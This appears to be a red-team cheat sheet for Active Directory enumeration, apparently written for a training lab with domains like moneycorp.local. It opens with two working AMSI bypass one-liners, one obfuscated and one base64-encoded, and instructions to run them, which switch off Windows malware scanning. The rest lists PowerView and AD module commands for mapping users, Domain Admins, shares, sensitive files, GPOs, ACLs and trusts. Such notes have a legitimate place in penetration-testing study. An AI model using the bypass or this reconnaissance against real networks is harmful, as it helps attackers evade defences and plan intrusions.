# Domain Enumeration


## Summary



```
$ADClass = [System.DirectoryServices.ActiveDirectory.Domain]
$ADClass::GetCurrentDomain()
```

## AMSI Bypass

1. Create a file named amsibypass.ps1 and paste the following script.
2. Run by ". .\amsibypass.ps1".

```
sET-ItEM ( 'V'+'aR' +  'IA' + 'blE:1q2'  + 'uZx'  ) ( [TYpE](  "{1}{0}"-F'F','rE'  ) )  ;    (    GeT-VariaBle  ( "1Q2U"  +"zX"  )  -VaL  )."A`ss`Embly"."GET`TY`Pe"((  "{6}{3}{1}{4}{2}{0}{5}" -f'Util','A','Amsi','.Management.','utomation.','s','System'  ) )."g`etf`iElD"(  ( "{0}{2}{1}" -f'amsi','d','InitFaile'  ),(  "{2}{4}{0}{1}{3}" -f 'Stat','i','NonPubli','c','c,'  ))."sE`T`VaLUE"(  ${n`ULl},${t`RuE} )
```

Base-64 to bypass AMSI

```
[Ref].Assembly.GetType('System.Management.Automation.'+$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('QQBtAHMAaQBVAHQAaQBsAHMA')))).GetField($([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('YQBtAHMAaQBJAG4AaQB0AEYAYQBpAGwAZQBkAA=='))),'NonPublic,Static').SetValue($null,$true)
```

### Get Current Domain

 - Get-NetDomain (PowerView.ps1)
 - Get-ADDomain (ActiveDirectory Module)

### Get object of another domain

 - Get-NetDomain -Domain moneycorp.local
 - Get-ADDomain -Identity moneycorp.local

### Get Domain SID for current domain

 - Get-DomainSID

### Get Domain policy for the current domain

 - Get-DomainPolicy
 - (Get-DomainPolicy)."system access"
 - (Get-DomainPolicy)."Kerberos policy"

### Get policy for another domain

 - (Get-DomainPolicy -domain moneycorp.local)."system access"

### Get domain controllers for the current domain
 
 - Get-NetDomainController
 - Get-ADDomainController

### Get domain controllers for another domain

 - Get-NetDomainController -Domain moneycorp.local
 - Get-ADDomainController -DomainName moneycorp.local -Discover 

### Get a list of users in the current domain

 - Get-NetUser
 - Get-NetUser -Username student1
 - Get-ADUser -Filter * -Properties *
 - Get-ADUser -Identity student1 -Properties *

### Get list of all properties for users in the current domain

```
 - Get-UserProperty
 - Get-UserProperty -Properties pwdlastset
 - Get-ADUser -Filter * -Properties * | select -First 1 | Get-Member -MemberType *Property | select Name
 - Get-ADUser -Filter * -Properties * | select name,@{expression={[datetime]::fromFileTime($_pwdlastset)}}
```
### Search for a particular string in a user's attributes 

```
 -  Find-UserField -SearchField Description -SearchTerm "built"
 -  Get-ADUser -Filter 'Description -like "*built*"' -Properties Description | select name,description
```

### Get a list of computers in the current domain 
```
 - Get-NetComputer
 - Get-NetComputer -OperatingSystem "*Server 2016*"
 - Get-NetComputer -Ping
 - Get-NetComputer -FullData 

 - Get-ADComputer -Filter * | select Name
 - Get-ADComputer -Filter 'OperatingSystem -like "*Server 2016*"' -Properties OperatingSystem | select name,OperatingSystem
 - Get-ADComputer -Filter * -Properties DNSHostName | %{Test-Connection -Count 1 -ComputerName $_.DNSHostname}
 Get-ADComputer -Filter * -Properties * 
```

### Get all the groups in the current domain

```
 - Get-NetGroup
 - Get-NetGroup -Domain <targetdomain>
 - Get-NetGroup -FullData
 - Get-NetGroup *admin*

 - Get-ADGroup -Filter * | select Name
 - Get-ADGroup -Filter * -Properties * 
 - Get-ADGroup -Filter 'Name -like "*admin*"' | select Name  
```

### Get all the members of the Domain Admins Group 

```
 - Get-NetGroupMember -GroupName "Domain Admins" -Recurse 
 - Get-ADGroupMember -Identity "Domain Admins" -Recursive
```

### Get the group membership for a user:

```
- Get-NetGroup -Username student1
- Get-ADPrincipalGroupMembership -Identity student1
```

### List all the local groups on a machine (needs administrator privs on non-dc machines):

 - Get-NetLocalGroup -ComputerName dcorp-dc.dollarcorp.moneycorp.local -ListGroups

### Get members of all the local groups on a machine (needs administrator privs on non-dc machines):

 - Get-NetLocalGroup -ComputerName dcorp-dc.dollarcorp.moneycorp.local -Recurse

### Get actively logged users on a computer (needs local admin rights on the target)

 - Get-NetLoggedon -ComputerName <servername>

### Get locally logged users on a computer (needs remote registry on the target - started by - default on server OS)

 - Get-LoggedonLocal -ComputerName dcorp-dc.dollarcorp.moneycorp.local 

### Get the last logged user on a computer (needs administrative rights and remote registry on the target)

 - Get-LastLoggedon -ComputerName <servername>

### Find shares on hosts in current domain.

 - Invoke-ShareFinder -Verbose

### Find sensitive files on computers in the domain.

 - Invoke-FileFinder -Verbose

### Get all fileservers of the domain

 - Get-NetFileServer

## GPO 

### Get list of GPO in current domain.

```
 - Get-NetGPO
 - Get-NetGPO -ComputerName dcorp-dc.dollarcorp.moneycorp.local 
 - Get-GPO -All (GroupPolicy Module)
 - Get-GPResultantSetOfPolicy -ReportType html -Path C:\Users\Administrator\report.html (provides RSoP) 
```
### Get GPO(s) which use Restricted Groups or groups.xml for interesting users

```
 - Get-NetGPOGroup
``` 

### Get users which are in a local group of a machine using GPO

```
- Find-GPOComputerAdmin -ComputerName dcorp-dc.dollarcorp.moneycorp.local
```

### Get machines where the given user is a member of a specific group

```
- Find-GPOLocation -Username student1 -Verbose
```

### Get OUs in the domain

```
Get-NetOU -FullData
Get-ADOrganizationalUnit -Filter * -Properties
```

### Get GPO applied on an OU. Read GPOname from gplink attribute from Get-NetOU

```
Get-NetGPO -GPOName "{AB306569-220D-43FF-B03B-83E8F4EF8081}"
Get-GPO -Guid AB306569-220D-43FF-B03B-83E8F4EF8081 (GroupPolicy Module)
```

## ACL

### Get the ACLs associated with the specified object 

```
Get-ObjectAcl -SamAccountName student1 -ResolveGUIDs
```

### Get the ACLs associated with the specified prefix to be used for search 

```
Get-ObjectAcl -ADSPrefix 'CN=Administrator,CN=Users' -Verbose
``` 

### We can also enumerate ACLs using ActiveDirectory module but without resolving GUIDs

```
(Get-Acl 'AD:\CN=Administrator,CN=Users,DC=dollarcorp,DC=moneycorp,DC=local').access
```

### Get the ACLs associated with the specified LDAP path to be used for search

```
Get-ObjectAcl -ADSpath "LDAP://CN=Domain Admins,CN=Users,DC=dollarcorp,DC=moneycorp" -ResolveGUIDs -Verbose
```

### Get the ACLs associated with the specified path

```
Get-PathAcl -Path "\\dcorp-dc.dollarcorp.moneycorp.local\sysvol"
```

## Trusts 

**Domain Trusts Mapping**

### Get a list of all domains trust for the current domain

```
 - Get-NetDomainTrust
 - Get-NetDomainTrust -Domain us.dollarcorp.moneycorp.local
 - Get-ADTrust
 - Get-ADTrust -Identity us.dollarcorp.moneycorp.local
```

**Forest Mapping**

### Get details about the current forest 

```
Get-NetForest
Get-NetForest -Forest eurocorp.local
Get-ADForest
Get-ADForest -Identity eurocorp.local
```
### Get all domains in the current forest

```
Get-NetForestDomain
Get-NetForestDomain -Forest eurocorp.local
(Get-ADForest).Domains
```
